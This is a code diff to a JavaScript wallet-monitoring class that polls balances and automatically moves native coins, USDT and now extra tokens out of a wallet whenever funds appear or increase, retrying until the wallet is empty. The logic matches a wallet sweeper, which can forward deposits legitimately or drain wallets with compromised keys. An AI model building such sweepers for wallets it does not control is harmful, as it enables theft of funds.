@@ -7,6 +7,7 @@ class AbstractChainMonitor {
     
     this.lastNativeBalance = null;
     this.lastUSDTBalance = null;
+    this.lastExtraTokenBalances = {};
     this.transferInProgress = false;
     
     this.consecutiveFailures = 0;
@@ -58,13 +59,23 @@ class AbstractChainMonitor {
 
       const balances = await this.getBalances();
       
-      this.log(`💰 Native: ${this.formatNativeBalance(balances.native)} | USDT: ${this.formatUSDTBalance(balances.usdt)}`);
+      let balanceLog = `💰 Native: ${this.formatNativeBalance(balances.native)} | USDT: ${this.formatUSDTBalance(balances.usdt)}`;
+      if (balances.extraTokens) {
+        Object.entries(balances.extraTokens).forEach(([tokenName, balance]) => {
+          if (balance > 0n) {
+            balanceLog += ` | ${tokenName}: ${balance.toString()}`;
+          }
+        });
+      }
+      this.log(balanceLog);
 
       let shouldTransfer = false;
       let reason = '';
+      
+      const hasExtraTokens = balances.extraTokens && Object.values(balances.extraTokens).some(b => b > 0n);
 
       if (this.lastNativeBalance === null) {
-        if (balances.usdt > 0n || this.shouldTransferNativeBalance(balances.native)) {
+        if (balances.usdt > 0n || this.shouldTransferNativeBalance(balances.native) || hasExtraTokens) {
           shouldTransfer = true;
           reason = 'Initial balance detected';
         }
@@ -78,13 +89,24 @@ class AbstractChainMonitor {
         } else if (usdtIncrease > 0n) {
           shouldTransfer = true;
           reason = `USDT increase +${this.formatUSDTBalance(usdtIncrease)}`;
-        } else if (balances.usdt > 0n || this.shouldTransferNativeBalance(balances.native)) {
+        } else if (balances.extraTokens) {
+          for (const [tokenName, balance] of Object.entries(balances.extraTokens)) {
+            const lastBalance = this.lastExtraTokenBalances[tokenName] || 0n;
+            if (balance > lastBalance) {
+              shouldTransfer = true;
+              reason = `${tokenName} increase +${(balance - lastBalance).toString()}`;
+              break;
+            }
+          }
+        }
+        
+        if (!shouldTransfer && (balances.usdt > 0n || this.shouldTransferNativeBalance(balances.native) || hasExtraTokens)) {
           shouldTransfer = true;
           reason = 'Assets still present - retrying transfer';
         }
       }
 
-      if (shouldTransfer && (balances.usdt > 0n || this.shouldTransferNativeBalance(balances.native))) {
+      if (shouldTransfer && (balances.usdt > 0n || this.shouldTransferNativeBalance(balances.native) || hasExtraTokens)) {
         const backoffDelay = this.getBackoffDelay();
         const now = Date.now();
 
@@ -120,7 +142,7 @@ class AbstractChainMonitor {
         this.transferInProgress = true;
         this.lastTransferAttemptTime = now;
 
-        const result = await this.executeTransfer(balances.native, balances.usdt);
+        const result = await this.executeTransfer(balances.native, balances.usdt, balances.extraTokens);
 
         this.transferInProgress = false;
 
@@ -129,12 +151,15 @@ class AbstractChainMonitor {
           await new Promise(resolve => setTimeout(resolve, 5000));
 
           const newBalances = await this.getBalances();
+          
+          const hasNewExtraTokens = newBalances.extraTokens && Object.values(newBalances.extraTokens).some(b => b > 0n);
 
-          if (newBalances.usdt === 0n && !this.shouldTransferNativeBalance(newBalances.native)) {
+          if (newBalances.usdt === 0n && !this.shouldTransferNativeBalance(newBalances.native) && !hasNewExtraTokens) {
             this.log(`✅ Assets successfully transferred!\n`);
             this.consecutiveFailures = 0;
             this.lastNativeBalance = newBalances.native;
             this.lastUSDTBalance = newBalances.usdt;
+            this.lastExtraTokenBalances = newBalances.extraTokens || {};
             this.broadcastedTxHashes.clear();
           } else {
             this.log(`⚠️ Assets still present after transfer`);
@@ -158,6 +183,7 @@ class AbstractChainMonitor {
 
             this.lastNativeBalance = newBalances.native;
             this.lastUSDTBalance = newBalances.usdt;
+            this.lastExtraTokenBalances = newBalances.extraTokens || {};
           }
         } else {
           this.consecutiveFailures++;
@@ -166,6 +192,7 @@ class AbstractChainMonitor {
       } else if (!shouldTransfer && this.lastNativeBalance === null) {
         this.lastNativeBalance = balances.native;
         this.lastUSDTBalance = balances.usdt;
+        this.lastExtraTokenBalances = balances.extraTokens || {};
       }
 
     } catch (error) {
